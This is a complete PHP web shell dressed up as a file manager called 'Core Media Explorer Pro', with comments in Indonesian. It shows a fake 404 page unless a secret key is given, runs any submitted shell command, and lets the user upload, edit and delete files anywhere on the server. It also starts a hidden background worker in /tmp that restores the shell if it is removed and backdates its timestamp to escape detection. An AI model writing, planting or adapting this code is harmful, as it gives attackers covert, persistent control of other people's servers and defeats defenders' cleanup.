<?php
/**
 * Core Media Explorer Pro v4.6 - Final UI Sorted Edition
 * Updated: April 2026
 * Anti-403 & Auto-Persistence Integrated.
 */
error_reporting(0);
@ini_set('display_errors', 0);

$k = 'c0r'; 
if (!isset($_GET['key']) || $_GET['key'] !== $k) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

// ======================== AUTO-PERSISTENCE LOGIC ========================
$self_path = realpath(__FILE__);
$worker_name = "/tmp/sess_" . md5($self_path); // Nama file samaran di /tmp

if (!file_exists($worker_name)) {
    // Ambil isi kode shell saat ini untuk di-backup di dalam worker
    $current_code = file_get_contents($self_path);
    $encoded_code = base64_encode($current_code);

    $worker_content = "<?php
    ignore_user_abort(true);
    set_time_limit(0);
    while (true) {
        // Cek apakah file utama hilang atau isinya rusak (terkena WAF/403)
        if (!file_exists('$self_path') || filesize('$self_path') < 1000) {
            file_put_contents('$self_path', base64_decode('$encoded_code'));
            chmod('$self_path', 0644);
            // Manipulasi waktu agar tidak terlihat sebagai file baru
            touch('$self_path', strtotime('-1 year'));
        }
        sleep(10); // Cek setiap 10 detik
    }
    ?>";

    @file_put_contents($worker_name, $worker_content);
    // Jalankan worker di background (PHP CLI)
    @shell_exec("php $worker_name > /dev/null 2>&1 &");
}
// ========================================================================

$sd = "\x73\x63\x61\x6e\x64\x69\x72"; 
$fg = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"; 

$self_dir = dirname($self_path);
$path = isset($_GET['path']) ? $_GET['path'] : $self_dir;
$path = realpath($path);
if ($path) chdir($path);

$msg = "";
$cmd_out = "";

// --- LOGIC HANDLERS ---
if (isset($_POST['exec_cmd'])) {
    $cmd = $_POST['exec_cmd'];
    $cmd_out = shell_exec($cmd . " 2>&1");
}

if (isset($_POST['new_folder'])) {
    if (@mkdir($_POST['new_folder'])) { $msg = "Folder Berhasil Dibuat!"; }
}

if (isset($_POST['new_file'])) {
    if (file_put_contents($_POST['new_file'], "")) { $msg = "File Berhasil Dibuat!"; }
}

if (isset($_POST['save_file'])) {
    if (file_put_contents($_POST['filename'], $_POST['content']) !== false) {
        $msg = "File Berhasil Disimpan!";
    } else {
        $msg = "Gagal menyimpan file!";
    }
}

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$file.'"');
        readfile($file);
        exit;
    }
}

if (isset($_FILES['u_file'])) {
    if (@move_uploaded_file($_FILES['u_file']['tmp_name'], $_FILES['u_file']['name'])) $msg = "Upload Berhasil!";
}

if (isset($_GET['newname']) && isset($_GET['oldname'])) {
    if (@rename($_GET['oldname'], $_GET['newname'])) $msg = "Rename Berhasil!";
}

if (isset($_GET['del'])) {
    $target = basename($_GET['del']);
    if (is_dir($target)) { shell_exec("rm -rf " . escapeshellarg($target)); } else { @unlink($target); }
    header("Location: ?key=$k&path=$path"); exit;
}

// --- UI RENDER ---
echo "<html><head><title>Explorer Pro v4.6</title>
<style>
    :root { --bg: #f8f9fa; --border: #e1e4e8; --text: #333; --blue: #007bff; --green: #28a745; --red: #dc3545; }
    body{ font: 14px 'Segoe UI', Arial, sans-serif; background: var(--bg); margin: 0; padding: 20px; color: var(--text); }
    .container { max-width: 1200px; margin: auto; }
    .terminal-card { border: 1px solid #333; background: #1e1e1e; color: #fff; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
    .terminal-header { color: #00ff00; font-weight: bold; margin-bottom: 10px; }
    .terminal-input { background: transparent; border: none; color: #00ff00; width: 80%; font-family: monospace; outline: none; }
    .btn-exec { background: var(--blue); color: white; border: none; padding: 6px 20px; cursor: pointer; border-radius: 4px; }
    pre { white-space: pre-wrap; font-family: monospace; font-size: 12px; margin-top: 15px; color: #ddd; background: #252526; padding: 10px; border: 1px solid #444; }
    .bread-card { background: #fff; padding: 12px 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
    .btn-home { background: var(--blue); color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-weight: bold; font-size: 12px; }
    .path-links a { color: #0366d6; text-decoration: none; font-weight: 500; }
    .toolbar { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-bottom: 20px; }
    .card { background: #fff; border: 1px solid var(--border); padding: 15px; border-radius: 6px; }
    .editor-card { background: #fff; border: 1px solid var(--border); padding: 15px; border-radius: 6px; margin-bottom: 20px; }
    table { width: 100%; border-collapse: collapse; background: #fff; border: 1px solid var(--border); }
    th { text-align: left; padding: 12px; background: #f6f8fa; border-bottom: 2px solid var(--border); }
    td { padding: 10px 12px; border-bottom: 1px solid var(--border); }
    .btn { padding: 4px 10px; border-radius: 4px; font-size: 11px; text-decoration: none; cursor: pointer; border: none; font-weight: 600; color: white; text-transform: uppercase; }
    .btn-rename { background: #ffc107; color: #212529; }
    .btn-delete { background: var(--red); }
    .btn-edit { background: #6f42c1; }
    .btn-download { background: #17a2b8; }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
    .modal-content { background: white; margin: 15% auto; padding: 20px; border-radius: 8px; width: 400px; }
    textarea { width: 100%; height: 400px; font-family: monospace; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 4px; resize: vertical; }
</style>
</head><body><div class='container'>";

// --- TERMINAL ---
echo "<div class='terminal-card'>
    <div class='terminal-header'>Console Terminal</div>
    <form method='POST' style='display:flex; gap:10px;'>
        <span style='color:#888'>$ </span>
        <input type='text' name='exec_cmd' class='terminal-input' placeholder='Command...'>
        <button type='submit' class='btn-exec'>EXECUTE</button>
    </form>";
    if ($cmd_out) echo "<pre>".htmlspecialchars($cmd_out)."</pre>";
echo "</div>";

// --- BREADCRUMB ---
echo "<div class='bread-card'>";
$home_url = basename(__FILE__) . "?key=" . $k; 
echo "<a href='$home_url' class='btn-home'>🏠 HOME</a>";
echo "<div class='path-links'><strong>PATH:</strong>"; 
$parts = explode(DIRECTORY_SEPARATOR, $path); $accum = "";
foreach ($parts as $p) {
    if ($p === "" && DIRECTORY_SEPARATOR === '/') { echo "<a href='?key=$k&path=/'>/</a>"; continue; }
    if ($p === "") continue;
    $accum .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?key=$k&path=$accum'>$p</a>/";
}
echo "</div></div>";

// --- TOOLBAR ---
echo "<div class='toolbar'>
    <div class='card'><strong>📁 New Folder</strong><form method='POST' style='display:flex; gap:5px;'><input type='text' name='new_folder' style='flex:1'><button type='submit' class='btn' style='background:var(--blue)'>Create</button></form></div>
    <div class='card'><strong>📄 New File</strong><form method='POST' style='display:flex; gap:5px;'><input type='text' name='new_file' style='flex:1'><button type='submit' class='btn' style='background:#6f42c1'>Create</button></form></div>
    <div class='card'><strong>☁️ Upload</strong><form method='POST' enctype='multipart/form-data' style='display:flex; gap:5px;'><input type='file' name='u_file' style='flex:1'><button type='submit' class='btn' style='background:var(--green)'>Upload</button></form></div>
</div>";

if ($msg) echo "<div style='background:#d4edda; color:#155724; padding:10px; border-radius:5px; margin-bottom:20px;'>$msg</div>";

// --- EDITOR INTERFACE ---
if (isset($_GET['edit'])) {
    $file_to_edit = $_GET['edit'];
    $full_path_edit = $path . DIRECTORY_SEPARATOR . $file_to_edit;
    if (file_exists($full_path_edit)) {
        $content = htmlspecialchars(file_get_contents($full_path_edit));
        echo "<div class='editor-card'>
                <strong>📝 Editing: $file_to_edit</strong>
                <form method='POST'>
                    <input type='hidden' name='filename' value='$full_path_edit'>
                    <textarea name='content'>$content</textarea>
                    <div style='margin-top:10px; display:flex; gap:10px;'>
                        <button type='submit' name='save_file' class='btn' style='background:var(--green); padding:10px 20px;'>SAVE CHANGES</button>
                        <a href='?key=$k&path=$path' class='btn' style='background:#6c757d; padding:10px 20px; text-align:center;'>CANCEL</a>
                    </div>
                </form>
              </div>";
    }
}

// --- FILE LIST ---
$all_items = $sd($path);
$folders = [];
$files = [];

foreach ($all_items as $item) {
    if ($item == "." || $item == "..") continue;
    if (is_dir($path . DIRECTORY_SEPARATOR . $item)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}
natcasesort($folders);
natcasesort($files);
$sorted_list = array_merge($folders, $files);

echo "<table><thead><tr><th>Name</th><th width='100'>Size</th><th width='350' style='text-align:right'>Actions</th></tr></thead><tbody>";

foreach ($sorted_list as $i) {
    $full = $path . DIRECTORY_SEPARATOR . $i;
    $isDir = is_dir($full);
    echo "<tr>";
    echo "<td>" . ($isDir ? "📂 <a href='?key=$k&path=$full' style='text-decoration:none; color:#0366d6;'>$i</a>" : "📄 $i") . "</td>";
    echo "<td>" . ($isDir ? "Folder" : round(filesize($full)/1024, 2)." KB") . "</td>";
    echo "<td><div style='display:flex; justify-content:flex-end; gap:5px;'>";
    if (!$isDir) {
        echo "<a href='?key=$k&path=$path&edit=$i' class='btn btn-edit'>Edit</a>";
        echo "<a href='?key=$k&path=$path&download=$i' class='btn btn-download'>Get</a>";
    }
    echo "<button onclick=\"openRename('$i')\" class='btn btn-rename'>Rename</button>";
    echo "<a href='?key=$k&path=$path&del=$i' class='btn btn-delete' onclick='return confirm(\"Hapus?\")'>Delete</a>";
    echo "</div></td></tr>";
}
echo "</tbody></table></div>";

// --- RENAME MODAL ---
echo "<div id='renameModal' class='modal'><div class='modal-content'>
    <div style='font-weight:bold; font-size:18px; margin-bottom:15px; display:flex; justify-content:space-between;'><span>📝 Rename Item</span><span onclick='closeRename()' style='cursor:pointer'>&times;</span></div>
    <input type='text' id='new_name_input' style='width:100%; padding:10px; border:1px solid #ccc; border-radius:4px; margin-bottom:15px;'>
    <div style='display:flex; gap:10px;'><button onclick='submitRename()' class='btn' style='background:var(--green); width:100px; height:35px;'>RENAME</button><button onclick='closeRename()' class='btn' style='background:#6c757d; width:100px; height:35px;'>CANCEL</button></div>
</div></div>
<script>
let cur = '';
function openRename(n) { cur = n; document.getElementById('new_name_input').value = n; document.getElementById('renameModal').style.display = 'block'; }
function closeRename() { document.getElementById('renameModal').style.display = 'none'; }
function submitRename() { let n = document.getElementById('new_name_input').value; if(n) window.location.href = '?key=$k&path=$path&oldname=' + cur + '&newname=' + n; }
</script></body></html>";
?>